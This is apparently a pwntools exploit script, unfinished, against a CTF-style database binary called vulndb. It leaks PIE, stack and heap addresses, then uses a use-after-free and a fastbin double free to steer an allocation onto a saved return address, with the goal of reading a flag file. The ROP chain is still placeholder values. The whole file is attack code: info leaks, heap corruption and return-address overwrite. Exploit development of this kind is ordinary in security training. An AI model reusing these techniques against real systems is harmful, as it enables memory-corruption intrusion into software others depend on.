#! /usr/bin/env python3
from pwn import *

binary = './vulndb_patched3_NX'
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

def create_db(name):
    r.sendlineafter('>>', 'Create db')
    r.sendafter('name:', name)
    print(r.recvline())

def delete_db(idx):
    r.sendlineafter('>>', 'Delete db')
    r.sendlineafter('id:', str(idx))

def select_db(idx):
    r.sendlineafter('>>', 'Select db')
    r.sendlineafter('id:', str(idx))

# TODO more = 'yes'
def create_table(tb_name, col_name, col_type, more='no'):
    r.sendlineafter('>>', 'Create table')
    r.sendafter('Table name:', tb_name)
    r.sendafter('Column name:', col_name)
    r.sendlineafter(':', str(col_type))
    r.sendlineafter('?', more)

def Drop_table(name):
    r.sendlineafter('>>', 'Drop table')
    r.sendlineafter('name:', name)
    print(r.recvline())

def insert(tb_name, data=''):
    r.sendlineafter('>>', 'Insert')
    r.sendafter('name:', tb_name)
    query = r.recvuntil(':', timeout=1).decode()
    if(query[1] == '[' and query[-1] == ':'):
        print(query)
        r.sendline(data)

def select_all(tb_name):
    r.sendlineafter('>>', 'Select all')
    r.sendlineafter('name:', tb_name)

def select(tb_name, row_id):
    r.sendlineafter('>>', 'Select')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    print(r.recvuntil('[')[:-1])

def delete(tb_name, row_id):
    r.sendlineafter('>>', 'Delete')
    r.sendafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))

def update(tb_name, row_id, data):
    r.sendlineafter('>>', 'Update')
    r.sendafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    r.sendafter(':', str(data))

def develop_mode(token='', data=''):
    r.sendlineafter('>>', 'developer mode')
    r.sendafter(':', token)
    if len(data):
        print(r.recvline())
        r.sendline(data)

def disconnect():
    r.sendlineafter('>>', 'Disconnect')
    print(r.recvline())

r = process(binary, env={"LD_LIBRARY_PATH":"."})
#input('>')
r.sendafter('>>', 'a'*0x7+'x')
r.recvuntil('x')
pie_base = u64(r.recvline().strip()+b'\x00'*2) - 0x1360
print("pie_base @ ", hex(pie_base))

r.sendafter('>>', 'a'*0xf+'x')
r.recvuntil('x')
stack = u64(r.recvline().strip()+b'\x00'*2)
print("stack @ ", hex(stack))

# leak heap

create_db('db0')
create_db('db1')
delete_db(0)
delete_db(1)
select_db(1)
r.recvuntil(b'[db:')
heap_base = u64(r.recvuntil(b']', drop=True).ljust(8, b'\0')) - 0x2a0
log.info('heap: {:#x}'.format(heap_base))


create_db('db2')
create_db('db3')
create_db('db4')

select_db(2)
create_table('/home/vulndb/flag', 'c'*0xf, 3)
for i in range(7):
    insert('/home/vulndb/flag', '123')

for i in range(7):
    delete('/home/vulndb/flag', 0)

# double free to fasbin
delete_db(3)
delete_db(4)
delete_db(3)


for i in range(7):
    insert('/home/vulndb/flag', '123')

sleep_got = pie_base + 0x60d8
ra = stack - 232
insert('/home/vulndb/flag', p64(ra))

raw_input('>')

payload = b'a'
insert('/home/vulndb/flag', b'a')
raw_input('>')
insert('/home/vulndb/flag', b'a')
raw_input('>')
chain = flat(
    0x5487,
    0xdeadbeef,
    0x66666666
)
payload = chain
insert('/home/vulndb/flag', payload)
raw_input('>')

#gdb.attach(r)
select_db(2)

r.interactive()
